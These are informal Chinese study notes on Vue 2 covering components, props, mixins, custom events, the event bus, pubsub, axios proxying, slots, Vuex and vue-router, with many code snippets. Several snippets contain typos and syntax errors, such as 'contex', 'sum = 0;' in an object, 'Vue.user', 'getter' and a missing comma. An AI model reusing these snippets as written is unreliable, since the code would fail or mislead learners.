vm里面需要模板解析器，Vue的<template> 标签在 package中有专门的库处理

#### 总结

关于不同版本的Vue:

1. 1,vue.js与vue,runtime,xxx,js的区别：

	vue,js是完整版的Vue,包含：核心功能+模板解析器。

	vue,runtime,xxx.js是运行版的Vue,只包含：核心功能：没有模板解析器。

2. 因为vue.runtime.xxx.js没有模板解析器，所以不能使用template标签配置项，需要使用

3. render函数接收到的createElement函数去指定具体内容。

### 脚手架的配置

查看配置命令

~~~bash
vue inspect > output.js
~~~

如果要修改脚手架以 Vue-cli 为例（比如语法检查）

修改 vue.config.js，**一定要重启**

**markdown的树结构创建**

~~~bash
npm install -g tree-cli
//windows
treee -l 2, -o out.md --directoryFirst --ignore "node_modules/" 
~~~

## 3.2ref属性

~~~vue
<template>
  <div>
    <h1>{{ name }}快学Vue</h1>
    <button @click="showDom" ref="btn">点击展示DOM</button>
  </div>
</template>

<script>
export default {
  name: "School",
  data: {
    name: "yovvis",
  },
  methods: {
    showDom() {
      console.log("@@", this.$refs.btn);
    },
  },
};
</script>
~~~

### 总结

1. 被用来给元素或子组件注册引用信息(id的替代者)

2. 应用在htm1标签上获取的是真实D0M元素，应用在组件标签上是组件实例对象(vc)

3. 使用方式：

	打标识：<h1ref="xxx">,,..</h1>或<School ref="xxx"></School>

	获取：this.$refs.xxx
	
4. 配合input框获取焦点使用

## 3.3props配置

~~~vue
<template>
  <div>
    <School :age="18" />
  </div>
</template>
~~~

~~~vue
<script>
export default {
  props: ["age"],//只接收
  props:{
      age:Number
  }// 限制类型
  props:{
    age:{
  		type:String,
    	defalut: 99
	}
  }
};
</script>
~~~

### 总结

配置项props
	功能：让组件接收外部传过来的数据
		(1).传递数据：
			<Demo name="xxx"/>
		(2).接收数据：
			第一种方式（只接收）：
			props:['name']
			第二种方式（限制类型）：
			props:{name:Number}
			第三种方式（限制类型、限制必要性、指定默认值）：
			props:{name:{type:String,//类型 required:true,//必要性 default:'老王'/默认值}
	备注：props,是只读的，Vue底层会监测你对props的修改，如果进行了修改，就会发出警告，若业务需求确实需要修改，

那么请复制props的内容到data中一份，然后去修改data中的数据。

## 3.4mixin混合

### 局部混合

mixin.js

~~~js
export const hunhe = {
    data() {
        return {
            x: 100
        }
    }
}
~~~

~~~vue
<script>
import { hunhe } from "../mixin";
export default {
  name: "School",
  data() {
    return {
      name: "yovvis",
    };
  },
  mixins: [hunhe],
  props:["age"]
};
</script>
~~~

### 全局混合

main.js

~~~vue
import { hunhe } from './mixin'
Vue.mixin(hunhe)
~~~

### 总结

功能：可以把说个组件共用的配置提取成一个混入对象
	使用方式：
	第一步定义混合，例如：
		data()[..},
		methods:{....}
	第二步使用混入，例如：
		(1).全局混入：Vue.mixin(xxx)
		(2).局部混入：mixins:['xxx']

## 3.5插件

plugin.js

~~~js
export default {
    // Vue的构造方法
    install(Vue) {
        // 全局过滤器
        Vue.filter('myfilter', function (value) {
            return value.slice(0, 4);
        })
        // 原型方法
        // 自定义指令
        // 全局混入

    }
}

~~~

main.js

~~~js
import Vue from 'Frontend/Vue/Vue'
import App from './App'
import plugins from './plugin'

Vue.config.productionTip = false
Vue.use(plugins)
new Vue({

	render: h => h(App)

}).$mount("#app")
~~~

### 总结

功能：用于增强Vue
本质：包邻nsal1方法的一个对象，instal1的第一个参数是Vue,第二个以后的参数是插件使用者传递的数据。
定义插件：
对象.install=function(Vue,options){
	//1.添加全局过滤器
		Vue.filter(....)
	//2.添加全局指令
		Vue.directive(....)
	//3.配置全局混入（合）
		Vue.mixin(....)
	//4.添加实例方法
		Vue.prototype.$myMethod function (){...}
		Vue.prototype.$myProperty xxxx

}

使用插件 Vue.use

## 3.6Scoped样式

问题：谁import在后，会覆盖前者

~~~css
<style lang="less">
</style>

<style scoped>
</style>
~~~

scoped只让样式在当前组件生效

**ps：**这里用less要安装less-loader

~~~bash
npm view webpack versions
npm view less-loader versions

npm i less-loader@7
~~~

## 3.7todo-list案例

### 组件化编码流程

1. 实现静态页面：抽取组件，使用组件实现静态页面效果
2. 展示动态数据：
  1. 数据类型、名称是什么
  2. 数据保存在哪个组件
3. 交互—从绑定监听开始

生成NanoId

~~~bash
npm install nanoid
~~~

**ps：**通过prop传的时候如果是一个对象，那么用v-model修改obj的对象是不会被检测有问题

### 总结

1. 组件化编码流程：

	(1).拆分静态组件：组件要按照功能点拆分，命名不要与html元素冲突。

	(2).实现动态组件：考虑好数据的存放位置，数据是一个组件在用，还是一些组件在用：	

	​	1).一个组件在用：放在组件自身即可。

	​	2).一些组件在用：放在他们共同的父组件上（**状态提升**）。

	(3),实现交互：从绑定事件开始。

2. propsi适用于：

	(1),父组件=>子组件通信

	(2).子组件=>父组件通信（要求父先给子一个函数）

3. 使用v-model时要切记：v-model绑定的值不能是props传过来的值，因为props是不可以修改的！

4. props传过来的若是对象类型的值，修改对象中的属性时ue不会报错，但不推荐这样做。

## 3.8浏览器本地存储

~~~html
<body>
    <button onclick="saveData()">点击保存一个数据</button>
    <button onclick="readData()">点击读取数据</button>
    <button onclick="removeData()">点击清除数据</button>
    <button onclick="clearData()">点击清空所有数据</button>
    <script type="text/javascript">
        function saveData() {
            let p = { id: '001', name: 'yovvis' };
            localStorage.setItem("msg", JSON.stringify(p))
        }

        function readData() {
            const p = localStorage.getItem("msg")
            console.log("", JSON.parse(p));
        }

        function removeData() {
            localStorage.removeItem("msg")
        }

        function clearData() {
            localStorage.clear()
        }
    </script>
</body>

~~~

localStorage和sessionStorage一样

### 总结

**<u>*webStorage*</u>**

1. 存储内容大小一般支持5MB左右（不同浏览器可能还不一样）

2. 浏览器端通过Window.sessionStorage和Window.localStorage属性来实现本地存储机制。

3. 相关API:

	1. xxxxxStorage.setItem('key','value');

		该方法接受一个键和值作为参数，会把键值对添加到存储中，如果键名存在，则更新其对应的值。

	2. xxxxxStorage.getItem('person');

		该方法接受一个键名作为参数，返回键名对应的值。

	3. xxxxxStorage.removeItem('key');

		该方法接受一个键名作为参数，并把该键名从存储中删除。

	4. xxxxxStorage.clear()

		该方法会清空存储中的所有数据。

4. 备注：

	1. SessionStorage存储的内容会随着浏览器窗口关闭而消失。
	2. LocalStorage存储的内容，需要手动清除才会消失。
	3. xxxxxStorage.getItem(xxx)如果XXx对应的value?获取不到，那么getltem的返回值是nul。
	4. JSoN.parse(nul1)的结果依然是null。

## 3.9todoList本地存储

todolist: Json.parse(localStorage.getItem("todoList")) || []

简略：这里要用`深度监视`

~~~js
watch: {
    todoList: {
      deep: true,
      handler(todoList) {
        localStorage.setItem("todoList", JSON.stringify(todoList));
      },
    },
 },
~~~



## 3.10组件自定义事件

内置事件是给html用的

自定义事件是给组件用的

### 绑定事件

例如

App.vue

~~~vue
<Student @yovvis="showStuName" />
methods: {
    showStuName(name) {
      console.log("@", name);
    },
  },
~~~

Student.vue

~~~vue
<template>
  <div>
    <h1>快学Vue!!!</h1>
    <h1>学生姓名:{{ name }}</h1>
    <h1>学生年龄:{{ age }}</h1>
    <button @click="showName">点击展示学生姓名</button>
  </div>
</template>
 methods: {
    showName() {
      // console.log("##", this.name);
      this.$emit("yovvis", this.name);
    },
  },
~~~

除了使用@xxx（v-on：xxx）还可以在组件身上自定义ref属性然后再mounted方法中调用**回调函数**

~~~vue
mounted(){
	this.refs.（ref）.$on("xxx",this.method);
}
~~~

### 解绑事件

~~~vue
  methods: {
    showName() {
      // console.log("##", this.name);
      this.$off("yovvis");
	  this.$off(["yovvis","demo"]);
      this.$off();
    },
  },
~~~

自杀原生的dom还是有用的，但是自定义事件都失效了

### 总结

1. 一种组件间通信的方式，适用于：**`子组件===>父组件`**

2. 使用场景：A是父组件，B是子组件，B想给A传数据，那么就要在A中给B绑定自定义事件（**<u>*`事件的回调在A中`*</u>**）。

3. 绑定自定义事件：

	1. 第一种方式，在父组件中：

		~~~js
		<Demo@yovvis="test"/>或<Demo v-on:yovvis="test"/>
		~~~

	2. 第二种方式，在父组件中：

		~~~js
		<Demo ref="demo"/>
		    
		mounted(){
		    this.$refs.xxx.$on('yovvis',this.test)
		}
		~~~

	3. 若想让自定义事件只能触发一次，可以使用once修饰符，或$once方法。

4. 触发自定义事件：this.$emit('yovvis',数据（参数）)

5. 解绑自定义事件this.$off('yovvis')

6. 组件上也可以绑定原生DOM事件，需要使用`native`修饰符。

7. 注意：通过this.$refs.xxx.$on('yovvis',回调)绑定自定义事件时，回调要么配置在methods中，要么用箭头函数，否则this指向会出问题

`@这里的native也是为什么vue组件只允许有一个外部div`

## 3.11todoList事件

App.vue

~~~vue
<template>
  <div id="root">
    <div class="todo-container">
      <div class="todo-wrap">
        <UserHeader @addTodo="addTodo" :todoList="todoList" />
      </div>
    </div>
  </div>
</template>
~~~

Header.vue

~~~vue
methods: {
    add(e) {
      if (this.title != null && this.title != "") {
        // 包装obj
        const obj = { id: nanoid(), name: this.title, done: false };
        this.$emit("addTodo", obj);
        this.title = "";
      }
    },
  },
~~~

这里改造就很简单了

## 3.12全局事件总线

`任意组件间通信`

1. 保证所有组件都能看到
2. 可以调用到$on、$off、$emit

> 在 `beforeCreate` 生命周期钩子函数中将 `\$bus` 添加到 `Vue.prototype` 是因为此时组件实例已经创建，但是还没有初始化。在这个阶段，你可以确保在所有组件的 `created` 钩子函数中都能够访问到 `\$bus`。
>
> 如果你在 `created` 生命周期钩子函数中添加 `\$bus`，可能会导致某些组件无法正常访问它，因为某些组件的 `created` 钩子函数可能在其他组件之前执行。通过在 `beforeCreate` 中添加 `\$bus`，可以确保所有组件的 `created` 钩子函数中都能够正确访问到 `\$bus` 对象。 

**<u>*接收方注册、发送方触发*</u>**

示例

main.js

~~~js
new Vue({
    render: h => h(App),
    beforeCreate() {
        Vue.prototype.$bus = this
    },
}).$mount("#app")
~~~

接收方`注册`，`回调`

```vue
 mounted() {
    this.$bus.$on("deleteTodo", this.deleteTodo);
  },
  beforeDestroy() {
    this.$bus.$off("deleteTodo");
  },
```

发送方`触发`，`传参`

~~~js
 methods: {
    handleDelete(id) {
      // this.deleteTodo(id);
      this.$bus.$emit("deleteTodo", id);
    },
  },
~~~

### 总结

1. 一种组件间通信的方式，适用于`任意组件间通信`。

2. 安装全局事件总线：

	~~~js
	new Vue({
	    ……
	    beforeCreate(){
			Vue.prototype.$bus = this
		},
	})
	~~~

3. 使用事件总线：

	1. 接收数据：A组件想接收数据，则在A组件中给$bus绑定自定义事件，事件的`回调留在A组件自身`。

		B提供数据

		~~~js
		methods(){
			demo(data){……}
		}
		……
		mounted(){
		    this.$bus.$emit("xxxx",this.demo);
		}
		~~~

	2. 提供数据：this.$bus.$emit('xxxx',数据)

4. 最好在beforeDestroy钩子中，用$off去解绑`当前组件`所用到的事件。

## 3.13todolist总线

参考3.12

## 3.14消息订阅与发布

需要第三方库pubsub-js

示例

订阅方`订阅`，`回调`

~~~js
  mounted() {
    this.pubid = pubsub.subscribe("deleteTodo", this.deleteTodo);// deleteTodo第一次参数要_
  },
  beforeDestroy() {
    pubsub.unsubscribe("pubid");
  },
~~~

发布方`发布`，`传参`

~~~js
  methods: {
    handleCheck(id) {
      this.checkeTodo(id);
    },
    handleDelete(id) {
      pubsub.publish("deleteTodo", id);
    },
  },
~~~

### 总结

1. 一种组件间通信的方式，适用于`任意组件间`通信。

2. 使用步骤：

	1. 安装pubsub:npm i pubsub-js

	2. 引入：import pubsub from'pubsub-js'

	3. 接收数据：A组件想接收数据，则在A组件中订阅消息，订阅的回调留在A`组件自身`。

		~~~js
		methods(){
			demo(data){……}
		}
		……
		mounted(){
		    // 这里如果是直接用function(){}回调，由于是用的第三方库所以this的话是undefined
		    this.pid=pubsub.subscribe('xxx',this.demo)
		}
		~~~

	4. 提供数据：pubsub.pub1ish('xxx',数据)

	5. 最好在beforeDestroy钩子中，用PubSub.unsubscribe(pid)去`取消订阅`。

Vue的插件是看不到第三方库的事件的

## 3.15todolist订阅

参考3.14

## 3.16编辑nextick

~~~vue
<span v-show="!todo.isEdit">{{ todo.name }}</span>
<button class="btn btn-edit" @click="handleEdit(todo)" v-show="!todo.isEdit">编辑</button>
methods: {
    handleEdit(todo) {
      if (todo.hasOwnProperty("isEdit")) {
        todo.isEdit = true;
      } else {
        this.$set(todo, "isEdit", true);
      }

      this.$nextTick(function () {
        this.$refs.inputTitle.focus();
      });
    },
    handleBlur(todo, e) {
      todo.isEdit = false;
      if (!e.target.value.trim()) {
        alert("不能为空");
      } else {
        this.$bus.$emit("updateTodo", todo.id, e.target.value);
      }
    },
}
~~~

这里$nextTick可以用定时器替换

作用是让下一次触发，实际上就是代码执行到这里先跳过，遇到等下一次解析dom完毕后触发

## 3.17过渡和动画

1. 作用：在任插入、更新或移除DOM元素时，在台适的时候给元素添加样式类名。

2. 图示：

	![image-20230621112508939](https://tyangjian.oss-cn-shanghai.aliyuncs.com/tmp/202306211126859.png)

3. 写法：

	1. 准备好样式：

		- 元素进入的样式：

			1.v-enter:进入的起点

			2.V-enter.active:进入过程中

			3.V-enter.to:进入的终点

		- 元素离开的样式：

			1.v-leave:离开的起点

			2.v-leave-active:离开过程中

			3.v-leave-to:离开的终点

	2. 使用<transition>包裹要过度的元素，并配置name属性：

		~~~html
		<transition name="hello">
			<h1 v-show="isShow">你好啊！</h1>
		</transition>
		~~~

	3. 备注：若有多个元素需要过度，则需要使用：<transition-group>:,且每个元素都要指定key值。

~~~css
.todo-enter-active{
    animation:yovvis 0.5s linear;
}
hello-leave-active{
    animation:yovvis 0.5s linear reverse;
}

@keyframes yovvis{
	from{
        transform:translatex(-100%);
    }
	to{
        transform:translatex(0px);}
}
~~~

## 3.18todolist动画

参考3.17

# Vue中的Ajax

## 4.1Vue中代理和ajax

### 原理

- `×` XHR newHttpRequest() xhr.open() xhr.send() win内置
- `×`jQuery $get $set  80%都是封装DOM操作
- axios promise风格
- `×`fetch win内置 promise风格（包两层，兼容性有问题）

```bash
npm i axios
```

~~~js
getData() {
  axios.get("http://localhost:5000/students").then(
    (response) => {
      console.log("请求成功", response.data);
    },
    (error) => {
      console.log("请求失败", error.message);
    }
  );
},
~~~

![源码理解图](https://tyangjian.oss-cn-shanghai.aliyuncs.com/tmp/202306211506963.png)

 

解决跨域

1. cors（服务器里面写了，携带特殊的响应头）
2. jsonp 通过script标签的src属性在外部引用资源不受同源限制的策略（只能解决get请求）
3. 代理服务器（vue-cli，ngnix）

~~~js
 devServer: {
    proxy: "http://localhost:5000"
 }
~~~

上述就是开启一个代理服务器：1、协议http 2、主机localhost 3、端口5000

**问题：**

1. 本机服务器中不能和数据服务器同名的文件或者地址
2. 不能开`多个代理`

~~~js
devServer: {
    proxy: {
        '/api':{
            target: "http://localhost:5000",
           	pathRewrite: { '^/api': '' }//这里通过下面原理图解决
            ws: true, // 用于websocket
            changeOrigin: true // 代理服务器是否说谎，控制请求头中host值，true 那么数据服务器检测来源是5000，false，那么数据服务器检测来源是8080
        }
    }
 }
~~~

原理

![多配置代理](https://tyangjian.oss-cn-shanghai.aliyuncs.com/tmp/202306211530649.png)

### 方法一

​	在vue.config.js中添加如下配置：

```js
devServer:{
  proxy:"http://localhost:5000"
}
```

说明：

1. 优点：配置简单，请求资源时直接发给前端（8080）即可。
2. 缺点：不能配置多个代理，不能灵活的控制请求是否走代理。
3. 工作方式：若按照上述配置代理，当请求了前端不存在的资源时，那么该请求会转发给服务器 （优先匹配前端资源）

### 方法二

​	编写vue.config.js配置具体代理规则：

```js
module.exports = {
	devServer: {
      proxy: {
      '/api1': {// 匹配所有以 '/api1'开头的请求路径
        target: 'http://localhost:5000',// 代理目标的基础路径
        changeOrigin: true,
        pathRewrite: {'^/api1': ''}
      },
      '/api2': {// 匹配所有以 '/api2'开头的请求路径
        target: 'http://localhost:5001',// 代理目标的基础路径
        changeOrigin: true,
        pathRewrite: {'^/api2': ''}
      }
    }
  }
}
/*
   changeOrigin设置为true时，服务器收到的请求头中的host为：localhost:5000
   changeOrigin设置为false时，服务器收到的请求头中的host为：localhost:8080
   changeOrigin默认值为true
*/
```

说明：

1. 优点：可以配置多个代理，且可以灵活的控制请求是否走代理。
2. 缺点：配置略微繁琐，请求资源时必须加前缀。

## 4.2Github搜索案例

asset里面的静态资源是要用ES6的import，`会严格检验`

解决方法

在public下面建立css，公共引用，用到哪个样式再去看有没有这个样式

~~~html
<!-- 引入第三方样式 -->
  <link rel="stylesheet" href="<%= BASE_URL %>css/bootstrap.css">
~~~

List.vue 接受方

~~~vue
<script>
export default {
  name: "List",
  data() {
    return {
      info: {
        isFirst: true,
        isLoad: false,
        errormsg: "",
        users: [],
      },
    };
  },
  mounted() {
    this.$bus.$on("UpdateList", (dataObj) => {
      this.info = { ...this.info, ...dataObj };
    });
  },
};
</script>
~~~

search.vue 发送方

~~~vue
<script>
export default {
  name: "Search",
  data() {
    return {
      keyword: "",
    };
  },
  methods: {
    searchName() {
      this.$bus.$emit("UpdateList", {
        isFirst: false,
        isLoad: true,
        errormessage: "",
        users: [],
      });
      axios.get(`https://api.github.com/search/users?q=${this.keyword}`).then(
        (response) => {
          console.log("请求成功");
          this.$bus.$emit("UpdateList", {
            isLoad: true,
            errormsg: "",
            users: response.data.items,
          });
        },
        (error) => {
          this.$bus.$emit("UpdateList", {
            isLoad: true,
            errormsg: error.message,
            users: [],
          });
        }
      );
    },
  },
};
</script>
~~~

## 4.3vue-resource

~~~bash
npm i vue-resource
~~~

一个插件

~~~js
import vueResource from 'vue-resource'
Vue.user(vueResource)

axios.get(xxx)
this.$http.get(xxx)
~~~

## 4.4solt插槽

### 默认插槽

App.vue

~~~vue
<template>
  <div class="container">
    <Category title="美食">
      <img src="https://s3.ax1x.com/2021/01/16/srJ1q0.jpg" alt="" />
    </Category>
    <Category title="游戏">
      <u1>
        <li v-for="(g,index)in games" key="index">{{ g }}</li>
      </u1>
    </Category>
    <Category title="电影">
      <video
        controls
        src="http://clips.vorwaerts-gmbh.de/big_buck_bunny.mp4"
      ></video>
    </Category>
  </div>
</template>
~~~

category.vue

~~~vue
<slot>默认</slot>
~~~

这里在App里面解析完了才会传给category组件

### 具名插槽

~~~vue
<Category tit1e="电影">
    <video slot="center"controls src="http://clips.vorwaerts-gmbh.de/big_buck"></video>
<template v-slot:footer>
	<div class="foot">
		<a href=:"http:/nw.atguigu.com">经典</a>
		<a href=:"http:/Mww.atguigu.com">热门k/a>
		<a href=:"http://wMw.atguigu.com">推荐</a>
	</div>
	<h4>欢迎前来观影</h4>
</template>
</Category>
~~~

~~~vue
<slot name="foot">默认</slot>
~~~

v-slot:name是vue2.6新出的，只能配合template标签使用

### 作用域插槽

1. 理解：<span style="color:red">数据在组件的自身，但根据数据生成的结构需要组件的使用者来决定。</span>（games数据在Category组件中，但使用数据所遍历出来的结构由App组件决定）

2. 具体编码：

~~~vue
父组件中：
		<Category>
			<template scope="scopeData">
				<!-- 生成的是ul列表 -->
				<ul>
					<li v-for="g in scopeData.games" :key="g">{{g}}</li>
				</ul>
			</template>
		</Category>

		<Category>
			<template slot-scope="scopeData">
				<!-- 生成的是h4标题 -->
				<h4 v-for="g in scopeData.games" :key="g">{{g}}</h4>
			</template>
		</Category>
子组件中：
        <template>
            <div>
                <slot :games="games"></slot>
            </div>
        </template>
		
        <script>
            export default {
                name:'Category',
                props:['title'],
                //数据在子组件自身
                data() {
                    return {
                        games:['lol','dota2','cos','2077']
                    }
                },
            }
        </script>
~~~





# VueX

## 5.1概念

**<u>*概念：*</u>**在Vue中实现集中式状态（数据）管理的一个Vue插件，对vue应用中多个组件的共享状态进行集中式的管理（读/写），也是一种组件间通信的方式，且适用于任意组件间通信。

## 5.2使用场景

**使用场景:**多个组件需要共享数据时

1. 多个组件依赖同一状态
2. 来自不同组件的行为需要变更同一状态

ps:<span style='color:red;'>全局事件总线实现数据共享</span>

<img src="https://tyangjian.oss-cn-shanghai.aliyuncs.com/tmp/202306221425840.png" alt="image-20230622142527942" style="zoom: 50%;" />

ps:<span style='color:red;'>vuex实现数据共享</span>

<img src="https://tyangjian.oss-cn-shanghai.aliyuncs.com/tmp/202306221434122.png" alt="image-20230622143431026" style="zoom:67%;" />

## 5.3纯vue案例



非常简单略

## 5.4Vuex工作原理

原理图

<img src="https://tyangjian.oss-cn-shanghai.aliyuncs.com/tmp/202306232226349.png" alt="image-20230623222637962" style="zoom:67%;" />

1. 这里的state就是存放数据的对象，像之前的toddolist都属于状态或者叫数据
2. action和mutations都是对象，里面的值是函数，mutations函数有两个参数一个是state，value
3. ajax需要用到Api
4. 三个对象都要`store`管理

## 5.5搭建Vuex

Vue2对应的vuex是3

~~~bash
npm i vuex@3
~~~



1. 创建文件：```src/store/index.js```

   ```js
   //引入Vue核心库
   import Vue from 'vue'
   //引入Vuex
   import Vuex from 'vuex'
   //应用Vuex插件
   Vue.use(Vuex)
   //准备actions对象——响应组件中用户的动作
   const actions = {
       jia(contex,value){
           context.commit('jia',value)
       }
   }
   //准备mutations对象——修改state中的数据
   const mutations = {
       jia(state,value){
           state.sum+=value
       }
   }
   //准备state对象——保存具体的数据
   const state = {
       sum = 0;
   }
   //创建并暴露store
   export default new Vuex.Store({
   	actions,
   	mutations,
   	state
   })
   ```

2. 在```main.js```中创建vm时传入```store```配置项

   ```js
   ......
   //引入store
   import store from './store'
   ......
   //创建vm
   new Vue({
   	el:'#app',
   	render: h => h(App),
   	store
   })
   ```



1. 初始化数据、配置```actions```、配置```mutations```，操作文件```store.js```

2. 组件中读取vuex中的数据：```$store.state.sum```

3. 组件中修改vuex中的数据：```$store.dispatch('action中的方法名',数据)``` 或 ```$store.commit('mutations中的方法名',数据)```

   >  备注：若没有网络请求或其他业务逻辑，组件中也可以越过actions，即不写dispatch，直接编写commit

***ps：必须在创建store之前use，es6会把import全部提前***

## 5.6Vuex案例

略

## 5.7Vuex开发工具

和Vue开发工具同一个

## 5.8store里的getter

相当于配置了store的计算属性

~~~vue
const getters = {
    bigSum(state) {
        return state.sum * 10
    }
}
{{$store.getters.bigSum}}
~~~

## 5.9mapState/getter

先引入 import {mapState} from 'vuex'

在computed中使用

**对象写法**

~~~vue
computed:{
	...mapState({he:'sum',jian:'jian'})
}
~~~

**数组写法**

~~~vue
computed:{
	...mapState(['sum','jian'])
}
~~~

## 5.10mapActs/Mutations

**对象写法**

~~~js
<button @click="jia(n)">每次加1</button>
...mapActions({ jia: "jia" }),
...mapMutations({ jia: "JIA" }),
~~~

这里默认生成的方法传入的默认值是$event，因此我们需要手动修改传入的参数

**数组写法**

~~~vue
<button @click="jia(n)">每次加1</button>
...mapActions(['jia']),
...mapMutations(['JIA']),
~~~

## 5.11多组件数据共享

~~~js
computed:{
	...mapState(['sum','jian'])
}
~~~

本质就是通过操作$store中的state从而引入state就可以

## 5.12Vuex模块化

src/store/index.js

~~~js
import Vue from 'vue'
import Vuex from 'vuex'
Vue.use(Vuex)

const countAbout = {
    namespaced:true,
    actions: {
        jia(context, value) {
            context.commit("JIA", value)
        }
    },
    mutations: {
        JIA(state, value) {
            state.sum += value;
        }
    },
    state: {
        sum: 98
    }
}
export default new Vuex.Store({
    modules: {
        countAbout
    }
})
~~~

这里namespaced要true才会被认可s

~~~js
...mapActions("coutAbout", { jia: "jia" }),
...mapActions("coutAbout", ["jia"]),
~~~

~~~js
 methods: {
    add() {
      const personobj = { id: nanoid(), name: this.name };
      this.$store.commit("personAbout/ADD_PERSON", personobj);
      this.name = "";
    },
  },
 computed:{
     firstP(){
         this.$store.getter["personAbout/firstPersonName"];
     }
 }
~~~

这里就需要用路径来解决命名空间问题

# Vue-router

## 6.1介绍和使用

**概念**

1. 路由：一组key-value的对应关系
2. 路由器：多个路由需要经过路由器管理

**应用场景**

实现SPA应用

1. 安装vue-router，命令：```npm i vue-router@3```vue2是用的3，vue3用的4

2. 应用插件：```Vue.use(VueRouter)```

3. 编写router配置项:

   ```js
   //引入VueRouter
   import VueRouter from 'vue-router'
   //引入Luyou 组件
   import About from '../components/About'
   import Home from '../components/Home'
   
   //创建router实例对象，去管理一组一组的路由规则
   const router = new VueRouter({
   	routes:[
   		{
   			path:'/about',
   			component:About
   		},
   		{
   			path:'/home',
   			component:Home
   		}
   	]
   })
   
   //暴露router
   export default router
   ```

4. 实现切换（active-class可配置高亮样式）

   ```vue
   <router-link active-class="active" to="/about">About</router-link>
   ```

5. 指定展示位置

   ```vue
   <router-view></router-view>
   ```

### 几个注意点

1. pages放路由组件
2. 路由组件是频繁挂载和销毁的
3. 每个组件都有$route，存放自己路由信息
4. 只有一个$router

~~~js
const router = new VueRouter({
	routes:[
		{
			path:'/about',
			component:About,
            children:[
                {
                    path:'news',
                    component:News
                }
            ]
		},
		{
			path:'/home',
			component:Home
		}
	]
})
~~~

## 6.2路由传参

简单示例

1. 传递参数

   ```vue
   <router-link :to="·/home/message/detail?id=${msg.id}&title=${msg.title}·">跳转</router-link>				
   <router-link 
   	:to="{
   		path:'/home/message/detail',
   		query:{
   		   id:666,
               title:'你好'
   		}
   	}"
   >跳转</router-link>
   ```

2. 接收参数：

   ```js
   $route.query.id
   $route.query.title
   ```

## 6.3路由命名

可以把使用路由的时候替换path

:to={name:'about'}

## 6.4路由的params参数

直接示例

1. 配置路由，声明接收params参数

   ```js
   {
   	path:'/home',
   	component:Home,
   	children:[
   		{
   			path:'news',
   			component:News
   		},
   		{
   			component:Message,
   			children:[
   				{
   					name:'xiangqing',
   					path:'detail/:id/:title', //使用占位符声明接收params参数
   					component:Detail
   				}
   			]
   		}
   	]
   }
   ```

2. 传递参数

   ```vue
   <!-- 跳转并携带params参数，to的字符串写法 -->
   <router-link :to="/home/message/detail/666/你好">跳转</router-link>
   				
   <!-- 跳转并携带params参数，to的对象写法 -->
   <router-link 
   	:to="{
   		name:'xiangqing',
   		params:{
   		   id:666,
               title:'你好'
   		}
   	}"
   >跳转</router-link>
   ```

   > 特别注意：路由携带params参数时，若使用to的对象写法，则不能使用path配置项，必须使用name配置！

## 6.5路由的props配置

​	作用：让路由组件更方便的收到参数

```js
{
	name:'xiangqing',
	path:'detail/:id',
	component:Detail,

	//第一种写法：props值为对象，该对象中所有的key-value的组合最终都会通过props传给Detail组件
	// props:{a:900}

	//第二种写法：props值为布尔值，布尔值为true，则把路由收到的所有params参数通过props传给Detail组件
	// props:true
	
	//第三种写法：props值为函数，该函数返回的对象中每一组key-value都会通过props传给Detail组件
	props(route){
		return {
			id:route.query.id,
			title:route.query.title
		}
	}
}
```

## 6.6router-link的replace

浏览器的历史记录（栈）push模式

replace模式就是破坏push模式

~~~vue
<router-link replace :to="·/home/message/detail?id=${msg.id}&title=${msg.title}·">跳转</router-link>				
~~~

## 6.7编程式路由导航

作用：不借助```<router-link> ```实现路由跳转，让路由跳转更加灵活

~~~js
method:{
	pushShow(m){
		this.$router.push({
			name: '详情',
            path: '/home/message/detail'
			query:{
				id:m.id,
				title:m.title
			}
		})
	},
	replaveShow(m){
		this.$router.replace({
			name: '详情',
			query:{
				id:m.id,
				title:m.title
			}
		})
	}
}
~~~

回退，前进

~~~js
methods: {
    back() {
      this.$router.back();
    },
    forward() {
       this.$router.forward();
    },
  },
~~~

## 6.8缓存路由组件

实际上我们切换组件的时候会销毁组件，缓存哪个路由组件

1. 作用：让不展示的路由组件保持挂载，不被销毁。

2. 具体编码：

	```vue
	<keep-alive include="News"> 
	    <router-view></router-view>
	</keep-alive>
	
	<keep-alive :include=["News","Messages"]> 
	    <router-view></router-view>
	</keep-alive>
	```

## 6.9新的生命周期钩子

场景：

- 缓存组件的里面使用了`定时器`，不触发销毁了
- 两个新的钩子是路由组件独有的

1. 作用：路由组件所独有的两个钩子，用于捕获路由组件的激活状态。
2. 具体名字：
	1. ```activated```路由组件被激活时触发。
	2. ```deactivated```路由组件失活时触发。

## 6.10路由守卫

- 都是在`src/router/index.js`里面进行配置
- 前置路由过滤之后有的标题要改
- 独享是每个route里面的配置项

1. 作用：对路由进行权限控制

2. 分类：全局守卫、独享守卫、组件内守卫

3. 全局守卫:

	```js
	//全局前置守卫：初始化时执行、每次路由切换前执行
	router.beforeEach((to,from,next)=>{
		console.log('beforeEach',to,from)
		if(to.meta.isAuth){ //判断当前路由是否需要进行权限控制
			if(localStorage.getItem('name') === 'yovvis'){ //权限控制的具体规则
				next() //放行
			}else{
				alert('暂无权限查看')
				// next({name:'guanyu'})
			}
		}else{
			next() //放行
		}
	})
	
	//全局后置守卫：初始化时执行、每次路由切换后执行
	router.afterEach((to,from)=>{
		console.log('afterEach',to,from)
		if(to.meta.title){ 
			document.title = to.meta.title //修改网页的title
		}else{
			document.title = 'vue_test'
		}
	})
	```

4. 独享守卫:

	```js
	beforeEnter(to,from,next){
		console.log('beforeEnter',to,from)
		if(to.meta.isAuth){ //判断当前路由是否需要进行权限控制
			if(localStorage.getItem('school') === 'atguigu'){
				next()
			}else{
				alert('暂无权限查看')
				// next({name:'guanyu'})
			}
		}else{
			next()
		}
	}
	```

5. 组件内守卫：

	```js
	//进入守卫：通过路由规则，进入该组件时被调用
	beforeRouteEnter (to, from, next) {
	},
	//离开守卫：通过路由规则，离开该组件时被调用
	beforeRouteLeave (to, from, next) {
	}
	```

***ps：***组件内守卫的离开是要切换另一个组件的时候调用，而不是像全局路由守卫点击组件前后都调用

## 6.11路由器工作模式

~~~js
mode:'history'
~~~

1. 对于一个url来说，什么是hash值？—— #及其后面的内容就是hash值。

2. hash值不会包含在 HTTP 请求中，即：hash值不会带给服务器。

3. hash模式：

	1. 地址中永远带着#号，不美观 。
	2. 若以后将地址通过第三方手机app分享，若app校验严格，则地址会被标记为不合法。
	3. 兼容性较好。

4. history模式：

	1. 地址干净，美观 。
	2. 兼容性和hash模式相比略差。
	3. 应用部署上线时需要后端人员支持，解决刷新页面服务端404的问题。(`每次刷新都会找服务器要资源`)

	 

### 简单创建一个本地服务器

[node+express](https://juejin.cn/post/7248914499914317885)

